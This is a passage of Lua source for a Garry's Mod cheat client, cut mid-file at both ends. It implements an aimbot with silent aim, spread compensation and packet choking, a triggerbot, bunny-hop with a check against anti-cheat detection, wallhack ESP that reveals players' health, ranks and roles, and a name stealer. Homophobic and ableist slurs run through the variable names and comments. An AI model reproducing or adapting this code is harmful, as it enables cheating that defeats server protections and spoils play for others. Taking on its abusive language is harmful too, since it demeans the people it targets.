    rtxt:SetSize(180, 15)

    end



    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( 45, 25 )

    faggot:SetPos( 250, 8 )

    faggot:SetText("Profile")

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    faggot.DoClick = function()

        AB.ChatText( "Opened steam profile of: "..v:Nick().." ("..v:SteamID()..")", Color(255,255,255) )

        v:ShowProfile()

        surface.PlaySound("buttons/button7.wav")

    end



    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( 45, 25 )

    faggot:SetPos( 300, 8 )

    faggot:SetText("Mute")

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        if !v:IsValid() then return end

        if v:IsMuted() then

            surface.SetDrawColor(200, 100, 000 ,255)

        else

            surface.SetDrawColor(100, 100, 200 ,255)

        end

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    faggot.DoClick = function()

        v:SetMuted( !v:IsMuted() )

        if v:IsMuted() then AB.ChatText( "Voice muted: "..v:Nick(), Color(255,255,255) ) else AB.ChatText( "Unmuted: "..v:Nick(), Color(255,255,255) ) end

        surface.PlaySound("buttons/button7.wav")

    end



    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( 60, 25 )

    faggot:SetPos( 350, 8 )

    faggot:SetText("Namesteal")

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        if AB.NameStealPlayer == v then

            surface.SetDrawColor(100, 200, 100 ,255)

        else

            surface.SetDrawColor(100, 100, 200 ,255)

        end

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    faggot.DoClick = function()

        if AB.NameStealPlayer == v then AB.NameStealPlayer = LocalPlayer() AB.ChatText( "Cleared name stealer target", Color(255,255,255) ) return end

        AB.NameStealPlayer = v

        AB.ChatText( "Set name stealer target to: "..v:Nick(), Color(255,255,255) )

        surface.PlaySound("buttons/button7.wav")

    end



    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( 60, 25 )

    faggot:SetPos( 415, 8 )

    faggot:SetText("Highlight")

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        if AB.IsTarget( v ) then

            surface.SetDrawColor(100, 200, 100 ,255)

        else

            surface.SetDrawColor(100, 100, 200 ,255)

        end

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    faggot.DoClick = function()

        if AB.IsTarget( v ) then AB.RemoveTarget(v) else AB.AddTarget(v) end

        surface.PlaySound("buttons/button7.wav")

    end



    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( 60, 25 )

    faggot:SetPos( 480, 8 )

    faggot:SetText("Friendly")

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        if AB.IsFriend( v ) then

            surface.SetDrawColor(100, 200, 100 ,255)

        else

            surface.SetDrawColor(100, 100, 200 ,255)

        end

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    faggot.DoClick = function()

        if AB.IsFriend( v ) then AB.RemoveFriend(v) else AB.AddFriend(v) end

        surface.PlaySound("buttons/button7.wav")

    end





    Plist:AddItem( plypanel2 )



end





end

concommand.Add("ace_players", AB.PlayerMenu)















------------------------------------------------------------------------BIG MEMES----------------------------------------------------------------------------------------







function AB.IsMessagePooled( netmessage )

status, error = pcall(net.Start,netmessage)

return status

end









------------------------------------------------------------------------DANK NOSPREAD----------------------------------------------------------------------------------------







function AB.GetGenericCone( cmd )

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    if !gun.Primary or !gun.Primary.Cone then return Angle( 0, 0, 0 ) end

    local meme = gun.Primary.Cone

    local meme2 = Vector( meme, meme, meme )

    local cone = odium.engine.GetWeaponCone( cmd, ply:EyeAngles(), meme2 )

    return cone

end



function AB.GetM9kCone( cmd )

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    if !gun.Primary or !gun.Primary.Spread or !gun.Primary.IronAccuracy then return Angle( 0, 0, 0 ) end

    local meme = gun.Primary.Spread

    if (gun:GetIronsights() == true) and ply:KeyDown(IN_ATTACK2) then meme = gun.Primary.IronAccuracy end

    local meme2 = Vector( meme, meme, meme )

    local cone = odium.engine.GetWeaponCone( cmd, ply:EyeAngles(), meme2 )

    return cone

end





local td = {}

local function dospread()

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    local vel = ply:GetVelocity():Length()



    aim = ply:GetAimVector()

        

    if not ply.LastView then

        ply.LastView = aim

        ply.ViewAff = 0

    else

        ply.ViewAff = Lerp(0.25, ply.ViewAff, (aim - ply.LastView):Length() * 0.5)

        ply.LastView = aim

    end

    

    cone = gun.HipCone * (cr and 0.75 or 1) * (gun.dt.Bipod and 0.3 or 1)

        

    if gun.dt.Status == FAS_STAT_ADS then

        td.start = ply:GetShootPos()

        td.endpos = td.start + aim * 30

        td.filter = ply

        

        tr = util.TraceLine(td)

        

        if tr.Hit then

            return Angle(0,0,0)

        else

            cone = gun.AimCone

        end

    end

    

    return math.Clamp(cone + gun.AddSpread * (gun.dt.Bipod and 0.5 or 1) + (vel / 10000 * gun.VelocitySensitivity) * (gun.dt.Status == FAS_STAT_ADS and 0.25 or 1) + ply.ViewAff, 0, 0.09 + gun.MaxSpreadInc)



end





function AB.GetFags2Cone( cmd )

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    local newang = ply:GetPunchAngle()

    math.randomseed( CurTime() )

    local cuntcone = gun.CurCone



--    newang = newang + (Angle(math.Rand(-cuntcone, cuntcone), math.Rand(-cuntcone, cuntcone), 0) )



    return newang

--    return LocalPlayer():GetPunchAngle()

end



--hook.Remove( "EntityFireBullets", "Fags2lmao" )

/*

hook.Add( "EntityFireBullets", "Fags2lmao", function( ent, data )

    local me = LocalPlayer()

    local gun = me:GetActiveWeapon()

    local oldang = me:EyeAngles()

    math.randomseed(CurTime())

    local Dir3 = (me:GetPunchAngle() + Angle(math.Rand(-gun.CurCone, gun.CurCone), math.Rand(-gun.CurCone, gun.CurCone), 0) * 25)

    print( "hax"..tostring( me:EyeAngles() - Dir3) )

--    print( "hax: "..tostring(oldang + -AB.GetFags2Cone( me:GetCurrentCommand() )) )

--    me:SetEyeAngles( oldang + -AB.GetFags2Cone( me:GetCurrentCommand() ) )

end)

*/

local hl2guns = {

    ["weapon_smg1"] = Vector( 0.04362, 0.04362, 0.04362 ),

    ["weapon_ar2"] = Vector( 0.02618, 0.02618, 0.02618 ),

    ["weapon_shotgun"] = Vector( 0.08716, 0.08716, 0.08716 ),

    ["weapon_pistol"] = Vector( 0.00873, 0.00873, 0.00873 ) ,

}



function AB.GetHL2Cone( cmd )

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    local meme = hl2guns[gun:GetClass()]

    local cone = odium.engine.GetWeaponCone( cmd, ply:EyeAngles(), meme )

    return cone

end



function AB.GetCurrentWeaponCone( cmd )

    if !odium or !odium.engine or !odium.engine.GetWeaponCone then 

        AB.ChatText( "Odium main module not present or malfunctioning! Compensated spread will not work!", Color(255,100,0) ) 

        AB.Vars.CompSpread = false 

        return Angle( 0, 0, 0 )

    end

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    if hl2guns[gun:GetClass()] or gun:GetClass() == "weapon_pistol" then return AB.GetHL2Cone( cmd ) end

    if gun.Primary and gun.Primary.Spread and gun.Primary.IronAccuracy then return AB.GetM9kCone( cmd ) end

    if gun.HipCone then return AB.GetFags2Cone( cmd ) end

    if gun.Primary and gun.Primary.Cone then return AB.GetGenericCone( cmd ) end

    return Angle( 0, 0, 0 )

end





local penistration = {

    ["SniperPenetratedRound"] = 20,

    ["pistol"] = 9,

    ["357"] = 12,

    ["smg1"] = 14,

    ["ar2"] = 16,

    ["buckshot"] = 5,

    ["slam"] = 5,

    ["AirboatGun"] = 17,

}



function AB.GetM9gayPenetration( ply, gun, tr, testent )

    if !gun.Penetration then return false end

    local ammotyp = gun.Primary.Ammo

    local penindex = 14

    if penistration[ammotyp] then penindex = penistration[ammotyp] end

    if tr.MatType == MAT_METAL and ammotyp != "SniperPenetratedRound" then return false end

    penindex = penindex - 0.05 -- precaution so we don't botch extreme range shots



    local penissize = tr.Normal * penindex

    if (tr.MatType == MAT_GLASS or tr.MatType == MAT_PLASTIC or tr.MatType == MAT_WOOD or tr.MatType == MAT_FLESH or tr.MatType == MAT_ALIENFLESH) then

        penissize = tr.Normal * (penindex * 2)

    end



    local ntrace     = {}

    ntrace.endpos    = tr.HitPos + tr.Normal * 99999

    ntrace.start     = tr.HitPos + penissize

    ntrace.mask              = MASK_SHOT

    ntrace.filter    = {ply}

    local trace     = util.TraceLine(ntrace)



    if trace.StartSolid or ( trace.Entity and trace.Entity != testent ) then return false end



    return true



end





function AB.CanWeaponPenetrate( tr, testent )

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    if !ply:IsValid() or !gun or !gun:IsValid() then return false end

    if gun.Primary and gun.Primary.Spread and gun.Primary.IronAccuracy then return AB.GetM9gayPenetration( ply, gun, tr, testent ) end

    return false

end





function AB.IsBabyGod( ply )

    if !ply:IsValid() or !ply:Alive() or ply:InVehicle() then return false end

    if ply:GetRenderMode() == RENDERMODE_TRANSALPHA and ply:GetColor().a == 100 then 

        return true

    else

        return false

    end

end





function AB.SetPacketChoke( choke )

    if !odium or !odium.engine then return end

    if choke then 

        odium.engine.SetSendPacketEnabled( true )

        odium.engine.SetChokedPacketNum( 0 )

    else

        odium.engine.ResetSendPacket()

        odium.engine.ResetChokedPacketNum()

    end

end









/*

function AB.GetPenetrationStrength( tr ) --heh

    if !AB.CanWeaponPenetrate() then return 0 end

    local ply = LocalPlayer()

    local gun = ply:GetActiveWeapon()

    if !ply:IsValid() or !gun or !gun:IsValid() then return 0 end

    if gun.Primary and gun.Primary.Spread and gun.Primary.IronAccuracy then return AB.GetM9gayPenetration( ply, gun ) end

    return 0

end

*/



function AB.FixMove( cmd, safe )

    local move = Vector( cmd:GetForwardMove(), cmd:GetSideMove(), cmd:GetUpMove() )

    local speed = math.sqrt( move.x * move.x + move.y * move.y )

    local mang = move:Angle()

    local yaw = math.rad( cmd:GetViewAngles().y - AB.InternalFakeAngles.y + mang.y )

    cmd:SetForwardMove( (math.cos(yaw) * speed) * 1 )

    cmd:SetSideMove( math.sin(yaw) * speed )

end





------------------------------------------------------------------------AIMBOT FUNCTIONS--------------------------------------------------------------------------------------







local isfiring = false

local lastoldang = 0



function AB.AimbotCore( cmd )

    local ply = LocalPlayer()

 

    if !AB.Vars.SilentAim then AB.InternalFakeAngles = 0 end

    if lastoldang and isangle( lastoldang ) then

        cmd:SetViewAngles( lastoldang )

        lastoldang = 0

        AB.SetPacketChoke( false )

    end



    if !AB.Vars.Aimbot then

        lastoldang = 0

        AB.AimbotPreviewTarget = -1

        AB.AimbotTarget = game.GetWorld()

        return

    end



    if !AB.Vars.AimbotStickyLock then

        local closestfag = AB.GetClosestToCursor( true )

        if closestfag != AB.AimbotTarget then AB.AimbotTarget = closestfag end

    end



    local atarg = AB.AimbotTarget

    local pozzed = AB.PrepareForAStomping( atarg )



    if isvector( pozzed ) then AB.AimbotPreviewTarget = pozzed end



    -- negate target if they are invalid for whatever reason

    if !atarg:IsValid() or AB.IsDead( atarg ) or !AB.InFOV( atarg ) or !AB.CanTargetPlayer( atarg ) or (AB.ToMetric(ply:GetPos():Distance(atarg:GetPos())) >= AB.NumberVars.AimbotDist) or !isvector( pozzed ) then

        AB.AimbotPreviewTarget = -1

        AB.AimbotTarget = AB.GetClosestToCursor( true )

        AB.InternalFakeAngles = 0

        return

    end



    -- snap only on fire option

    if AB.Vars.SnapOnFire and !input.IsMouseDown(MOUSE_LEFT) or !ply:GetActiveWeapon() or !ply:GetActiveWeapon():IsValid() or !AB.CanBotShoot( ply:GetActiveWeapon() ) then 

--        AB.AimbotTarget = game.GetWorld()

        targetlerp = LocalPlayer():EyeAngles()

        return 

    end



    -- keybind mode

    if AB.Vars.AimbotBindMode then

        local khn = AB.NumberVars.AimbotBindKey

        if not ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then

 --           AB.AimbotTarget = game.GetWorld()

            targetlerp = LocalPlayer():EyeAngles()

            return 

        end

    end

    

    -- cap a motherfucker

    AB.AimbotPreviewTarget = pozzed

    local aids = pozzed - ply:GetShootPos()

    aids = aids:Angle()

    aids:Normalize()

--    if AB.NumberVars.AimbotSmooth > 0 then

--        targetlerp = LerpAngle(FrameTime() * ((51 - AB.NumberVars.AimbotSmooth) / 5), targetlerp, aids)

--        aids = targetlerp

--    end



    if AB.Vars.CompSpread then

        local cone = AB.GetCurrentWeaponCone( cmd )

        aids = aids + -cone

    end



    aids = Angle( aids.p, aids.y, 0 )

    if AB.Vars.SilentAim then 

        AB.SetPacketChoke( true )

        lastoldang = cmd:GetViewAngles() + Angle( cmd:GetMouseY() * 0.02, -cmd:GetMouseX() * 0.015, 0 )

        AB.InternalFakeAngles = lastoldang

    end

    cmd:SetViewAngles(aids)

    if AB.Vars.SilentAim then AB.FixMove( cmd, true ) end



    if AB.Vars.AutoShoot then    

        if( !isfiring ) then

            cmd:SetButtons( bit.bor( cmd:GetButtons(), IN_ATTACK ) ) 

            isfiring = true

        else

            cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_ATTACK ) ) )                      

            isfiring = false

        end

    end



    if AB.Vars.AutoTrigger then

        if ply:KeyDown(IN_ATTACK) then cmd:RemoveKey(IN_ATTACK) end

    end



end





AB.BHopBuffer = {}

AB.BHopCount1 = 0

AB.BHopCount2 = 0

AB.StoredOnGround = false

AB.StoredInJump   = false



function AB.ResetCounters()

    AB.BHopCount1 = 0

    AB.BHopCount2 = 0

    for i = #AB.BHopBuffer, 1, -1 do

        AB.BHopBuffer[i] = nil

    end

end









local vw = Angle( 0, 0, 0 )

local targetlerp = Angle( 0, 0, 0)

local nxtangle = false

function AB.CreateMove( cmd )



local ply = LocalPlayer()

if !ply:IsValid() then return end



local amemfootprint = gcinfo()





if( AB.Vars.Autoclick and !AB.Vars.RopeStorm) then

    if ply:KeyDown(IN_ATTACK2) then cmd:RemoveKey(IN_ATTACK2) end

    if ply:KeyDown(IN_ATTACK) then cmd:RemoveKey(IN_ATTACK) end

    end



    if( AB.Vars.Bhop) then

        if AB.Vars.BhopAutostrafe and !ply:IsFlagSet( FL_ONGROUND ) and ply:GetMoveType() != MOVETYPE_NOCLIP then

            if cmd:GetMouseX() < 0 then

                cmd:SetSideMove(-1000000)

            end

            if cmd:GetMouseX() > 0 then

                cmd:SetSideMove(1000000)

            end

        end





////////////////////////// credit goes to invalid/kilgrave for this UD bhop ///////////////////////////







        if AB.BHopCount1 < 13 then

            if(cmd:KeyDown(2) && !ply:IsOnGround()) then

                cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( 2 ) ) );

            end

        elseif(cmd:KeyDown(IN_JUMP)) then

            cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( 2 ) ) );

        end



        local lastOnGround = AB.StoredOnGround

        local lastInJump   = AB.StoredInJump

    

        local onGround = ply:IsOnGround()

        local inJump   = cmd:KeyDown (IN_JUMP)

    

        if lastOnGround and !onGround then

            AB.BHopCount2 = 0

        elseif !lastOnGround and onGround then

            if !lastInJump and inJump then

                AB.BHopCount1 = AB.BHopCount1 + 1

--                ply:ChatPrint(AB.BHopCount1)

                if AB.BHopCount1 == 14 then

                    local a, b, c = 0, 0, 0

                    for i = 1, #AB.BHopBuffer do

                        local x = AB.BHopBuffer [i]

                        a = a + 1 

                        b = b + x

                        c = c + x * x

                    end

                

                    if (c - b * b / a) / a < 0.1 then

--                    ply:ChatPrint("Detected")

                        AB.ChatText( "Whoops, your bhope abuse may have been detected! The protection system is good but not perfect I'm sorry to say", Color(255,205,205) )

                    end

                end

            else

                AB.ResetCounters()

            end

    elseif onGround then

        if lastInJump != inJump then

            AB.ResetCounters()

        end

    end

    

    if !onGround and

        lastInJump and not inJump and

        AB.BHopCount2 >= 0 then

        AB.BHopBuffer[#AB.BHopBuffer + 1] = AB.BHopCount2

        AB.BHopCount2 = -math.huge

    end

    

    AB.BHopCount2 = AB.BHopCount2 + 1

    

    AB.StoredOnGround = onGround

    AB.StoredInJump   = nJump



////////////////////////// old and gay ///////////////////////////



/*

        if !ply:IsFlagSet( FL_ONGROUND ) and ply:GetMoveType() != MOVETYPE_NOCLIP then

            cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_JUMP ) ) )

        end

*/

    end





    if AB.Vars.Triggerbot and ply:Alive() and ply:GetActiveWeapon() and ply:GetActiveWeapon():IsValid() and AB.CanBotShoot( ply:GetActiveWeapon() ) then

        local td = {start = ply:GetShootPos(), endpos = ply:GetShootPos() + ply:EyeAngles():Forward() * 65535, filter = ply, mask = MASK_SHOT}

        local tr = util.TraceLine(td)



        if (tr.Entity:IsPlayer() and AB.CanTargetPlayer( tr.Entity ) ) or tr.Entity:IsNPC() or tr.Entity.Type == "nextbot" then

            if( !isfiring ) then

                cmd:SetButtons( bit.bor( cmd:GetButtons(), IN_ATTACK ) )           

                isfiring = true

            else

                cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_ATTACK ) ) )                      

                isfiring = false

            end

        end



    end



    if AB.ScrollDelta != 0 then cmd:SetMouseWheel( AB.ScrollDelta ) end



    if( AB.Vars.RopeStorm and ply:KeyDown(IN_ATTACK2)) then

        local aids = Angle(math.random(-90, 90), math.random(-180, 180), 0)

        aids:Normalize()

        cmd:SetViewAngles(aids)

    if ply:KeyDown(IN_ATTACK2) then cmd:RemoveKey(IN_ATTACK2) end

    end







    if AB.Vars.FreecamControls then

        local khn = AB.NumberVars.FreecamForward

        if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then AB.FreecamCoordinates.pos = AB.FreecamCoordinates.pos + AB.FreecamCoordinates.ang:Forward() * 7 end

        local khn = AB.NumberVars.FreecamBack

        if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then AB.FreecamCoordinates.pos = AB.FreecamCoordinates.pos - AB.FreecamCoordinates.ang:Forward() * 7 end

        local khn = AB.NumberVars.FreecamLeft

        if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then AB.FreecamCoordinates.ang.y = AB.FreecamCoordinates.ang.y + 1 end

        local khn = AB.NumberVars.FreecamRight

        if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then AB.FreecamCoordinates.ang.y = AB.FreecamCoordinates.ang.y - 1 end

        local khn = AB.NumberVars.FreecamUp

        if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then AB.FreecamCoordinates.ang.p = AB.FreecamCoordinates.ang.p - 0.75 end

        local khn = AB.NumberVars.FreecamDown

        if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then AB.FreecamCoordinates.ang.p = AB.FreecamCoordinates.ang.p + 0.75 end

    end



    AB.AimbotCore( cmd )



    AB.MemoryDebug["aimbot"] = gcinfo() - amemfootprint



end

hook.Add( "CreateMove", "cmove", AB.CreateMove )





local xraytrans = Color(255, 255, 255, 101)



surface.CreateFont( "memes", {

    font = "Trebuchet",

    size = 200,

    weight = 950,

} )



local scanmat = Material("particle/particle_ring_blur")

local leadermat = Material( "particle/particle_ring_wave_additive" )

local beammat = Material("trails/laser")



function AB.Vision()

local me = LocalPlayer()

if !me:IsValid() then return end



local memfootprint = gcinfo()

/*

for i = 0, ScrH(), 200 do

    for w = 0, ScrW(), 200 do

        draw.SimpleTextOutlined( ":^)", "memes", w, i, Color(255,255,255,255), 0, 0, 1, Color(0,0,55,255) )

    end

end



draw.SimpleTextOutlined( "IM A HUGE FUCKING FAGGOT", "memes", 200, ScrH() / 2 - 230, Color(255,0,0,255), 0, 0, 1, Color(0,0,55,255) )

draw.SimpleTextOutlined( "WHO USES LEAKED HACKS", "memes", 260, ScrH() / 2 - 50, Color(255,0,0,255), 0, 0, 1, Color(0,0,55,255) )

draw.SimpleTextOutlined( "COS IM POOR AND RETARDED", "memes", 180, ScrH() / 2 + 150, Color(255,0,0,255), 0, 0, 1, Color(0,0,55,255) )

*/



if !AB.Vars.Vision then return end





if AB.Vars.CSFlashlight then

    local dlight = DynamicLight( me:EntIndex() + 5 )

    if ( dlight ) then

        dlight.pos = me:GetEyeTraceNoCursor().HitPos

        dlight.r = 255

        dlight.g = 255

        dlight.b = 255

        dlight.brightness = 2

        dlight.Decay = 1000

        dlight.Size = 2256

        dlight.DieTime = CurTime() + 0.5

    end

end



if AB.Vars.ShowESP then

-- players

for k, v in pairs( player.GetAll() ) do



    if AB.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > AB.NumberVars.VisionDist then continue end

    if !AB.OnScreen( v, 50 ) then continue end



    local teamcol, teamcol2

    if AB.Vars.TeamColors then

        teamcol = team.GetColor(v:Team())

        teamcol2 = Color(math.Clamp(teamcol.r - 100, 0, 255), math.Clamp(teamcol.g - 100, 0, 255), math.Clamp(teamcol.b - 100, 0, 255), 255)

    else

        teamcol = AB.DefaultScheme

        teamcol2 = AB.DefaultScheme2

    end





if v == me then continue end



local pos = (v:GetPos() + Vector(0, 0, 45)):ToScreen()

local admintext = AB.GetRank( v )



if !AB.IsDead( v ) then

    if AB.Vars.VSquares then

        surface.SetDrawColor(teamcol)

        surface.DrawOutlinedRect(pos.x - 10, pos.y - 10, 20, 20)

        surface.SetDrawColor(teamcol2)

        surface.DrawOutlinedRect(pos.x - 8, pos.y - 8, 16, 16)

        surface.SetDrawColor(Color(255,255,255,255))

        surface.DrawRect(pos.x - 2, pos.y - 2, 4, 4)

    end

    if AB.Vars.VNames then draw.SimpleTextOutlined( v:Name(), "DermaDefault", pos.x, pos.y - 30, teamcol, 1, 0, 1, Color(0,0,55,255) ) end





    if AB.Vars.BoundingBox3d then cam.Start3D(EyePos(),EyeAngles()) render.DrawWireframeBox( v:GetPos(), Angle(0,0,0), Vector( -16, -16, 0 ), Vector( 16, 16, 72 ), AB.ColScheme, true ) cam.End3D() end

    -- propkill shit



    render.SetMaterial( beammat )

    if AB.Vars.PKPlayerBeams then

        local vz, ppos = AB.PlayerVisiblePK( me:GetShootPos(), v )

        if vz then

            cam.Start3D(EyePos(),EyeAngles())

            render.DrawBeam( (me:GetShootPos() + Vector(0,0,-5)) + EyeAngles():Forward() * 5, ppos, 5, 0, 1, teamcol )

            cam.End3D()

        end

    end



    if AB.Vars.PKPropBeams then

        if AB.HoldingProp and AB.HoldingProp:IsValid() then

            local src = AB.HoldingProp:LocalToWorld( AB.HoldingProp:OBBCenter() )

/*

            cam.Start3D(EyePos(),EyeAngles())

            render.StartBeam( 5 )

            for i = 0, 4 do

                local zp = src + (me:GetAimVector() * (i * 200)) + Vector( 0, 0, -(i ^ 3.15))

                render.AddBeam( zp, 150, i, Color( 255, 100, 0) )

            end

            render.EndBeam()

            render.DrawBeam( me:EyePos(), me:EyePos() + me:GetAimVector() * 2000, 50, 0, 1, Color( 255, 100, 0) )

            cam.End3D()

*/

            local vz2, ppos2 = AB.PlayerVisiblePK( src, v )

            if vz2 then

                cam.Start3D(EyePos(),EyeAngles())

                render.DrawBeam( src, ppos2, 50, 0, 1, teamcol2 )

                cam.End3D()

            end

        end

    end



    -- target highlighting



    if AB.Vars.ShowTargets and AB.IsTarget( v ) then

    draw.SimpleTextOutlined( "[TARGETED]", "DermaDefault", math.Clamp(pos.x, 30, ScrW() - 54), math.Clamp(pos.y - 42, 30, ScrH() - 54), Color(255,155,0,255), 1, 0, 1, Color(55,20,0,255) )

    surface.SetDrawColor(Color(255,155,0,255))

    surface.DrawRect( pos.x - 20, pos.y - 15, 4, 30 )

    surface.DrawRect( pos.x + 16, pos.y - 15, 4, 30 )



    surface.DrawRect( pos.x - 30, pos.y - 20, 4, 40 )

    surface.DrawRect( pos.x + 26, pos.y - 20, 4, 40 )



    surface.DrawLine( ScrW() / 2, ScrH(), pos.x, pos.y )

    end

    if AB.Vars.ShowFriends and AB.IsFriend( v ) and !AB.IsTarget( v ) then

        draw.SimpleTextOutlined( "[FRIEND]", "DermaDefault", pos.x, pos.y - 42, Color(0,255,0,255), 1, 0, 1, Color(0,0,55,255) )

    end

    if AB.Vars.ShowRanks and !(admintext == "user" or admintext == "guest" or admintext == "player") then

        draw.SimpleTextOutlined( "["..admintext.."]", "DermaDefault", pos.x, pos.y + 12, Color(255,100,0,255), 1, 0, 1, Color(50,0,0,255) )

    end

    if AB.Vars.ShowTraitors and table.HasValue( AB.Traitors, v ) then

    draw.SimpleTextOutlined( "[TRAITOR]", "DermaDefault", pos.x, pos.y - 56, Color(255,55,0,255), 1, 0, 1, Color(55,10,0,255) )

    end

    if AB.Vars.Vizlines then

        local tr = util.TraceLine ({

        start = v:EyePos(),

        endpos = v:EyePos() + v:GetAimVector() * 5000,

        filter = v,

        mask = MASK_SOLID_BRUSHONLY

        })

        local tp = tr.HitPos:ToScreen()

        local p = v:EyePos():ToScreen()

        surface.DrawLine(p.x, p.y, tp.x, tp.y)

        surface.SetDrawColor(teamcol)

        surface.DrawLine(tp.x - 4, tp.y, tp.x + 4, tp.y)

        surface.DrawLine(tp.x, tp.y - 4, tp.x, tp.y + 4)

    end



    if AB.Vars.ShowDistance then 

        draw.SimpleTextOutlined( AB.ToMetric(me:GetPos():Distance(v:GetPos())).."m", "DermaDefault", pos.x, pos.y + 24, teamcol, 1, 0, 1, Color(0,0,55,255) )

   end

    if AB.Vars.ShowHP then

        local colhp = math.Clamp(v:Health() * 3, 0, 255)

        local colcomp = Color(255,colhp,0,255)

        draw.SimpleTextOutlined( tostring(v:Health()).."%", "DermaDefault", pos.x, pos.y + 38, colcomp, 1, 0, 1, Color(0,0,0,255) )

    end



    if AB.Vars.PKVelocity then

        local velpos = ((v:GetPos() + Vector(0, 0, 45)) + v:GetVelocity() * 0.3 ):ToScreen()

        surface.SetDrawColor(teamcol)

        surface.SetMaterial( leadermat )

        surface.DrawTexturedRect(velpos.x - 15, velpos.y - 15, 30, 30)

        surface.SetDrawColor(teamcol2)

        surface.DrawTexturedRect(velpos.x - 10, velpos.y - 10, 20, 20)

    end



-- the fag is dead, i dunno why i did a second logic block for this, im just retarded i guess

elseif AB.Vars.ShowDead then

    surface.SetDrawColor(Color(255,255,255,255))

    surface.DrawLine(pos.x - 15, pos.y - 15, pos.x + 15, pos.y + 15)

    surface.DrawLine(pos.x + 15, pos.y - 15, pos.x - 15, pos.y + 15)

    if AB.Vars.VNames then draw.SimpleTextOutlined( v:Name(), "DermaDefault", pos.x, pos.y - 30, teamcol, 1, 0, 1, Color(0,0,55,255) ) end

    if AB.Vars.ShowFriends and AB.IsFriend( v ) then

        draw.SimpleTextOutlined( "[FRIEND]", "DermaDefault", pos.x, pos.y - 42, Color(0,255,0,255), 1, 0, 1, Color(0,0,55,255) )

    end

    if AB.Vars.ShowRanks and !(admintext == "user" or admintext == "guest" or admintext == "player") then

        draw.SimpleTextOutlined( "["..admintext.."]", "DermaDefault", pos.x, pos.y + 12, Color(255,100,0,255), 1, 0, 1, Color(50,0,0,255) )

    end

    if AB.Vars.ShowDistance then 

        draw.SimpleTextOutlined( AB.ToMetric(me:GetPos():Distance(v:GetPos())).."m", "DermaDefault", pos.x, pos.y + 24, teamcol, 1, 0, 1, Color(0,0,55,255) )

    end

end





end -- end of players loop



if AB.Vars.ESPProps then

    for k, v in pairs(ents.FindByClass("prop_physics")) do

        if AB.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > AB.NumberVars.VisionDist then continue end

        local pos = (v:LocalToWorld(v:OBBCenter())):ToScreen()

        surface.SetDrawColor(AB.DefaultScheme)

        surface.DrawOutlinedRect(pos.x - 10, pos.y - 10, 20, 20)

        local aligndist = surface.GetTextSize( AB.ToMetric(me:GetPos():Distance(v:GetPos())).."m" )

        draw.SimpleTextOutlined( AB.ToMetric(me:GetPos():Distance(v:GetPos())).."m", "DermaDefault", pos.x - (aligndist / 2), pos.y + 12, AB.DefaultScheme, 0, 0, 1, Color(0,0,55,255) )

    end

end







if AB.Vars.Entfinder then

    for k, v in pairs(ents.GetAll()) do

        if AB.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > AB.NumberVars.VisionDist then continue end

        if !AB.OnScreen( v, 20 ) then continue end

        local drawing = false



        for i,p in pairs(AB.MarkedEnts) do

            if v:GetClass() == p then

                drawing = true

            end

        end



        if drawing then

        local pos = (v:LocalToWorld(v:OBBCenter())):ToScreen()

        surface.SetDrawColor(Color(255,255,255,255))

        surface.DrawRect(pos.x - 3, pos.y - 3, 6, 6)

        local alignclass = surface.GetTextSize( tostring(v:GetClass()) )

        draw.SimpleTextOutlined( tostring(v:GetClass()), "DermaDefault", pos.x - (alignclass / 2), pos.y + 12, AB.DefaultScheme, 0, 0, 1, Color(0,0,55,255) )

        end



    end



end



end -- end of showesp





if AB.Freecam then

    local CamData = {}

    CamData.origin = AB.FreecamCoordinates.pos

    CamData.angles = AB.FreecamCoordinates.ang

    CamData.x = AB.NumberVars.MirrorX

    CamData.y = AB.NumberVars.MirrorY

    CamData.w = ScrW() / (AB.NumberVars.MirrorSize / 10)

